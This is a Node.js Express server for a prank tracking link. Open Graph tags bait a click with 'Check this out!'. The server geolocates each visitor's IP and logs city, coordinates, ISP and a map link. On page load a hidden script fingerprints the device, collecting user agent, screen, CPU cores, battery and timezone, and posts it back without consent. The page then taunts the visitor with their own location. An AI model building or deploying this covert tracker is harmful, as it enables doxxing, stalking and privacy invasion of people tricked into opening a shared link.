const express = require('express');
const app = express();

app.set('trust proxy', true);
app.use(express.json());

// 1. API Endpoint: Receives client-side device/browser telemetry
app.post('/api/log', (req, res) => {
  const visitorIp = req.ip || req.headers['x-forwarded-for'] || 'Unknown IP';
  const { 
    userAgent, 
    language, 
    timeZone, 
    screenWidth, 
    screenHeight, 
    colorDepth, 
    pixelRatio, 
    cores, 
    touchPoints, 
    batteryLevel, 
    isCharging 
  } = req.body;

  console.log(`\n============== [TELEMETRY RECEIVED] ==============`);
  console.log(`IP Address       : ${visitorIp}`);
  console.log(`User-Agent       : ${userAgent}`);
  console.log(`Language         : ${language}`);
  console.log(`Time Zone        : ${timeZone}`);
  console.log(`Screen Size      : ${screenWidth}x${screenHeight} (DPI Ratio: ${pixelRatio}, Color Depth: ${colorDepth}-bit)`);
  console.log(`Hardware Specs   : ${cores ? cores + ' CPU Cores' : 'Cores unknown'}, ${touchPoints} Touch Points`);
  
  if (batteryLevel !== null && batteryLevel !== undefined) {
    console.log(`Battery Status   : ${batteryLevel}% ${isCharging ? '(Charging)' : '(Discharging)'}`);
  } else {
    console.log(`Battery Status   : Not supported/blocked by browser`);
  }
  console.log(`==================================================\n`);

  res.sendStatus(200);
});

// 2. Main Route: Renders landing page and fetches location/ISP data
app.get('/', async (req, res) => {
  const visitorIp = req.ip || req.headers['x-forwarded-for'] || 'Unknown IP';
  
  let ispName = 'Unknown ISP';
  let countryName = 'Unknown Location';
  let cityName = 'Unknown City';
  let lat = null;
  let lon = null;

  // Fetch location & network metadata from IP API
  try {
    const geoResponse = await fetch(`http://ip-api.com/json/${visitorIp}`);
    const geoData = await geoResponse.json();
    
    if (geoData.status === 'success') {
      ispName = geoData.isp || geoData.org || 'Unknown ISP';
      countryName = geoData.country || 'Unknown Location';
      cityName = geoData.city || 'Unknown City';
      lat = geoData.lat;
      lon = geoData.lon;
    }
  } catch (error) {
    console.log('Error fetching IP data:', error.message);
  }

  // Server console logging
  console.log(`[VISITOR ALERT] IP: ${visitorIp} | Location: ${cityName}, ${countryName} (${lat}, ${lon}) | ISP: ${ispName}`);
  if (lat && lon) {
    console.log(`[APPROX MAP] https://www.google.com/maps?q=${lat},${lon}`);
  }

  // Send HTML page with embedded script for client-side interactions & metrics
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">

      <!-- Open Graph Preview Tags -->
      <meta property="og:type" content="website" />
      <meta property="og:url" content="https://dancingkangaroos.up.railway.app" />
      <meta property="og:title" content="Check this out!" />
      <meta property="og:description" content="Click the link to view content." />
      <meta property="og:image" content="https://i.kym-cdn.com/entries/icons/original/000/000/091/Trollface.png" />

      <title>Gotcha!</title>
      <style>
        body {
          background-color: #ffffff;
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          margin: 0;
          font-family: Arial, sans-serif;
          text-align: center;
        }
        img {
          max-width: 80%;
          height: auto;
          border-radius: 8px;
        }
        h1 {
          color: #333;
          margin-top: 20px;
        }
        p {
          color: #666;
          font-size: 18px;
        }
        .region-selector {
          margin-top: 20px;
          padding: 15px;
          border: 1px solid #ccc;
          border-radius: 5px;
        }
      </style>
    </head>
    <body>
      <img src="https://i.kym-cdn.com/entries/icons/original/000/000/091/Trollface.png" alt="Trollface">
      <h1>You got tricked!</h1>
      <p>Greetings to someone connecting via <strong>${ispName}</strong> in <strong>${cityName}, ${countryName}</strong>.</p>

      <div class="region-selector">
        <h3>Select Your Region</h3>
        <p>We use location data to display relevant local content and events.</p>
        <button id="detectLocationBtn">Detect My Location</button>
        <p>Or manually choose your region:</p>
        <select id="countrySelect">
          <option value="IE">Ireland</option>
          <option value="UK">United Kingdom</option>
          <option value="US">United States</option>
        </select>
      </div>

      <script>
        document.getElementById('detectLocationBtn').addEventListener('click', () => {
          if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
              (position) => {
                console.log("User consented to location access:", position.coords.latitude, position.coords.longitude);
              },
              (error) => {
                console.log("Location access denied or timed out.");
              }
            );
          }
        });

        async function collectDeviceMetrics() {
          const payload = {
            userAgent: navigator.userAgent,
            language: navigator.language || 'Unknown',
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            colorDepth: window.screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1,
            cores: navigator.hardwareConcurrency || null,
            touchPoints: navigator.maxTouchPoints || 0,
            batteryLevel: null,
            isCharging: null
          };

          if ('getBattery' in navigator) {
            try {
              const battery = await navigator.getBattery();
              payload.batteryLevel = Math.round(battery.level * 100);
              payload.isCharging = battery.charging;
            } catch (e) {
              // Ignore if restricted by browser
            }
          }

          fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          }).catch(err => console.log('Telemetry error:', err));
        }

        window.addEventListener('DOMContentLoaded', collectDeviceMetrics);
      </script>
    </body>
    </html>
  `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
